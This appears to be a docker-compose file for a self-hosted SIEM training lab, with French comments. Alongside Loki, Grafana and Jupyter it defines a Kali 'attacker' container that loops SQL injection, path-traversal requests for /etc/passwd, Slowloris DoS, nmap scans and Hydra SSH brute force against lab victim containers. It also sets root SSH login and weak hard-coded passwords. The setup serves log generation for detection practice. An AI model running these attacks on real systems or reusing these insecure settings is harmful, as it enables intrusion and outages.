services:
  loki:
    image: grafana/loki:3.0.0
    container_name: siem_loki
    ports:
      - "3100:3100"
    volumes:
      - ./config/loki-config.yaml:/etc/loki/local-config.yaml
    command: -config.file=/etc/loki/local-config.yaml
    networks:
      - siem-net

  promtail:
    image: grafana/promtail:3.0.0
    container_name: siem_promtail
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./config/promtail-config.yaml:/etc/promtail/config.yml
    command: -config.file=/etc/promtail/config.yml
    networks:
      - siem-net
    depends_on:
      - loki

  grafana:
    image: grafana/grafana:latest
    container_name: siem_grafana
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    networks:
      - siem-net
    depends_on:
      - loki

  jupyter:
    image: jupyter/scipy-notebook:latest
    container_name: siem_analyst
    ports:
      - "8888:8888"
    environment:
      - JUPYTER_TOKEN=securetoken123
    volumes:
      - ./jupyter:/home/jovyan/work
    networks:
      - siem-net

  # --- NOUVEAUTÉS ---

  # LA VICTIME : Un serveur SSH léger
  victim:
    image: alpine:latest
    container_name: victim_server
    # On installe SSH et on le configure pour envoyer les logs dans le terminal (stderr)
    # pour que Docker/Promtail puisse les lire.
    command: >
      sh -c "apk add --no-cache openssh &&
      ssh-keygen -A &&
      sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config &&
      echo 'root:monmotdepassecomplex' | chpasswd &&
      /usr/sbin/sshd -D -e"
    networks:
      - siem-net

  # L'ATTAQUANT : Utilise Hydra pour bruteforcer la victime
  attacker:
    image: kalilinux/kali-rolling
    container_name: attacker_bot
    command: >
      bash -c "
      echo '--- [INIT] INSTALLATION DES OUTILS ---';
      apt-get update && apt-get install -y hydra curl nmap slowhttptest &&
      
      echo '--- [INIT] GENERATION WORDLIST ---';
      rm -f /tmp/passlist.txt &&
      for i in {1..1000}; do echo pass_wrong_$$i >> /tmp/passlist.txt; done &&
      
      echo '--- DEMARRAGE DE LA BOUCLE D ATTAQUE ---';
      while true; do
        
        # --- PHASE 1 : BRUIT WEB (Fuzzing & 404) ---
        # C'est ce qui alimente ton panneau 'Web Fuzzing' actuel
        echo '[PHASE 1] Web Fuzzing (Generation 404)...';
        for i in {1..30}; do
          curl -s -o /dev/null http://web_server/admin_hidden_$$i.php &
        done;

        # --- PHASE 2 : ATTAQUES WEB AVANCEES (SQLi & Traversal) ---
        # Nouveaux vecteurs pour les nouveaux notebooks
        echo '[PHASE 2] Web Attacks (SQLi & Path Traversal)...';
        for i in {1..10}; do
          # Injection SQL
          curl -s 'http://web_server/login?user=admin&pass=%27%20OR%201%3D1%20--' > /dev/null &
          # Path Traversal (Tentative d'accès à /etc/passwd)
          curl -s 'http://web_server/../../etc/passwd' > /dev/null &
        done;

        # --- PHASE 3 : DENI DE SERVICE (L7 DoS) ---
        # On lance Slowloris en arrière-plan pendant 20 secondes
        echo '[PHASE 3] L7 DoS (Slowloris)...';
        slowhttptest -c 50 -H -g -o /dev/null -i 10 -r 200 -t GET -u http://web_server/ -x 24 -p 3 -l 20 &

        # --- PHASE 4 : SCAN RESEAU ---
        # On utilise Nmap en mode 'aggressif' (-A) pour générer plus de logs
        echo '[PHASE 4] Network Scanning (Nmap)...';
        curl -s -A 'Mozilla/5.0 (compatible; Nmap Scripting Engine)' http://web_server/scan_signature_check;
        nmap -F -T4 web_server > /dev/null;

        # --- PHASE 5 : BRUTEFORCE SSH ---
        # On le met à la fin en mode 'bloquant' (sans &) pour temporiser la boucle
        echo '[PHASE 5] SSH Bruteforce (Hydra)...';
        hydra -l root -P /tmp/passlist.txt -t 4 victim_server ssh;

        echo '[CYCLE END] Pause respiration (5s)...';
        sleep 5;
      done"
    networks:
      - siem-net
    depends_on:
      - victim
      - web_victim
  
  web_victim:
      image: nginx:alpine
      container_name: web_server
      volumes:
        # On remplace la config par défaut par la nôtre
        - ./nginx.conf:/etc/nginx/nginx.conf:ro
      networks:
      - siem-net

networks:
  siem-net:
    driver: bridge